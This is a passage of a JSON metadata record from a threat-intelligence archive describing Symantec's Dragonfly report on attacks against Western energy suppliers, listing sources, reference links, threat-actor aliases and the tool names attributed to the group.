Ellis St. rights reserved. Symantec, the Symantec Logo,\n\nand the Checkmark Logo are trademarks or\n\nMountain View, CA 94043 USA\n\nregistered trademarks of Symantec Corporation\n\n+1 (650) 527-8000 or its affiliates in the U.S. and other countries.\n1 (800) 721-3934 Other names may be trademarks of their\nwww.symantec.com respective owners.\n\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec\nCorporation.\n\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use\nof the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or\ntypographical errors. Symantec reserves the right to make changes without prior notice.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "d63ae2b7-445f-460d-965d-2676dacdb6de",
            "created_at": "2022-10-25T15:59:19.552139Z",
            "updated_at": "2022-10-25T15:59:19.552139Z",
            "deleted_at": null,
            "name": "APTnotes",
            "url": "https://github.com/aptnotes/data",
            "description": "APTnotes data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://app.box.com/s/edyb0yn2g8ozavlmxoh082l7z5o5v3yx",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2014/2014.06.30.Dragonfly/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf",
        "https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2014/Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf"
    ],
    "report_names": [
        "Dragonfly_Threat_Against_Western_Energy_Suppliers",
        "Dragonfly_Threat_Against_Western_Energy_Suppliers.pdf"
    ],
    "threat_actors": [
        {
            "id": "5cbf6c32-482d-4cd2-9d11-0d9311acdc28",
            "created_at": "2023-01-06T13:46:38.39927Z",
            "updated_at": "2025-03-27T02:00:02.823829Z",
            "deleted_at": null,
            "main_name": "ENERGETIC BEAR",
            "aliases": [
                "DYMALLOY",
                "TG-4192",
                "Crouching Yeti",
                "Group 24",
                "Havex",
                "IRON LIBERTY",
                "Blue Kraken",
                "ALLANITE",
                "Koala Team",
                "G0035",
                "ATK6",
                "ITG15",
                "Ghost Blizzard",
                "BERSERK BEAR"
            ],
            "source_name": "MISPGALAXY:ENERGETIC BEAR",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "649b5b3e-b16e-44db-91bc-ae80b825050e",
            "created_at": "2022-10-25T15:50:23.290412Z",
            "updated_at": "2025-03-27T02:00:55.431037Z",
            "deleted_at": null,
            "main_name": "Dragonfly",
            "aliases": [
                "TEMP.Isotope",
                "DYMALLOY",
                "Berserk Bear",
                "TG-4192",
                "Crouching Yeti",
                "IRON LIBERTY",
                "Energetic Bear",
                "Ghost Blizzard"
            ],
            "source_name": "MITRE:Dragonfly",
            "tools": [
                "MCMD",
                "Impacket",
                "CrackMapExec",
                "Backdoor.Oldrea",
                "Mimikatz",
                "PsExec",
                "Trojan.Karagany",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "3a0be4ff-9074-4efd-98e4-47c6a62b14ad",
            "created_at": "2022-10-25T16:07:23.590051Z",
            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716504,
    "ts_updated_at": 1743041499,
    "ts_creation_date": 1404737692,
    "ts_modification_date": 1404737694,
    "files": {
        "pdf": "https://archive.orkl.eu/1856b8232153c3cc879662288b34b4a660586a9a.pdf",
        "text": "https://archive.orkl.eu/1856b8232153c3cc879662288b34b4a660586a9a.txt",
        "img": "https://archive.orkl.eu/1856b8232153c3cc879662288b34b4a660586a9a.jpg"
    }
}